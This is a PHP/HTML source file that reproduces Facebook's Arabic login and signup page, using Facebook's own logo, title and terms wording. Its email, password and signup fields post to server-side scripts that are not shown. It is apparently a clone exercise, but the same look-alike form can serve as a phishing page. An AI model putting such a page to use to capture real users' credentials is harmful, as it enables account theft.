<?php
include('server.php');
?>
<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>facebook</title>
    <link rel="stylesheet" href="fb_login.css">
    <!-- jquery plugin -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</head>

<body>
    <div class="fb-login">
        <div class="container">
            <div class="row-box justify-content-between">
                <div class="right-content">
                    <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="فيسبوك">

                    <h2> يمنحك فيسبوك إمكانية التواصل مع الأشخاص <br>ومشاركة ما تريد معهم </h2>
                </div>
                <div class="left-content">
                    <form class="facebook__form">
                        <div class="form-group">

                            <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" name="email" class="form__mail">
                            <p class="email_error_msg"></p>
                            <input type="password" placeholder="كلمة السر" name="password" class="form__password">
                            <p class="password_error_msg"></p>
                            <div class="login">
                                <input class="btn form__btn" value="تسجيل الدخول" />
                            </div>
                            <div class="forgot">
                                <a href="">هل نسيت كلمة السر؟</a>
                            </div>
                            <div class="create-btn">
                                <a href="" id="signup-account" class="btn">إنشاء حساب جديد</a>
                            </div>
                            <p class="server__errors"></p>

                    </form>

                </div>
                <p><a href="">إنشاء صفحة</a> ‏ لفرق موسيقية أو مشاهير أو أنشطة تجارية.</p>
            </div>
        </div>
    </div>

    <div class="modal" id="myModal" style="display: none;">
        <p><span class="error">* required field</span></p>
        <form class="modal-signup form-group" method="post" action="signup.php" id="signupForm">

            <div class="modal-close">
                X
            </div>

            <div class="modal-signup-heading">

                <p class="modal-signup-name">إنشاء حساب في فيسبوك</p>

                <p class="modal-signup-child-name">يتميز بالسرعة والسهولة</p>

            </div>

            <div class="modal-signup-name">

                <input type="text" placeholder="الاسم الأول" name="firstName" class="first_name">
                <input type="text" placeholder="اسم العائلة" name="lastName" class="last_name">

            </div>
            <p class="signup_name_error_msg"></p>
            <div class="modal-signup-email">

                <input type="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" name="signup_email" id="signupemail" class="signup_email">

            </div>
            <p class="signup_email_error_msg"></p>

            <div class="modal-signup-email">
                <input name="emailConfirm" class="emailConfirm" type="email" placeholder="أعد إدخال البريد الإلكتروني" id="confemail" />
            </div>
            <p class="signup_confirmemail_error_msg"></p>

            <div class="modal-signup-password">

                <input type="password" placeholder="كلمة السر الجديدة" name="password" class="signup_password">

            </div>
            <p class="signup_password_error_msg"></p>

            <div class="modal-date-birth">

                <label for="">تاريخ الميلاد</label>

                <div class="modal-date-alert">

                    <a>&#63;</a>

                </div>

            </div>

            <div class="modal-date-selection">

                <?php include('date_birth.php'); ?>
            </div>
            <p class="signup_birthdate_error_msg"></p>

            <div class="modal-gender">

                <label for="">الجنس</label>

                <div class="modal-gender-alert">

                    <a>&#63;</a>

                </div>

            </div>

            <div class="modal-gender-choice">

                <div class="modal-gender-name">

                    <label for="gender">أنثى</label>

                    <input type="radio" name="gender" class="gender" value="female">


                </div>

                <div class="modal-gender-name">

                    <label for="gender">ذكر</label>

                    <input type="radio" name="gender" class="gender" value="male">

                </div>

                <div class="modal-gender-name">

                    <label for="gender">مخصص</label>

                    <input type="radio" name="gender" class="gender" value="custom">

                </div>

            </div>
            <p class="signup_gender_error_msg"></p>

            <div class="modal-signup-terms">

                <p> بالنقر على "‏إنشاء حساب في فيسبوك‏"، فإنك توافق على ‏الشروط‏ و‏سياسة البيانات‏ و‏سياسة ملفات تعريف الارتباط‏. ويمكن أن تتلقى إشعارات عبر رسائل SMS من فيسبوك، ويمكنك إلغاء تلقي هذه الإشعارات في أي وقت.
                </p>

            </div>

            <div class="modal-signup-button">

                <input type="submit" name="signup" id="signupBtn" class="signup_btn" value="تسجيل الاشتراك"></input>

            </div>
            <p class="signup_server__errors"></p>
            <p class="success_result"></p>
    </div>

    </form>

    </div>



    <script src="./index.js"></script>

</body>





</html>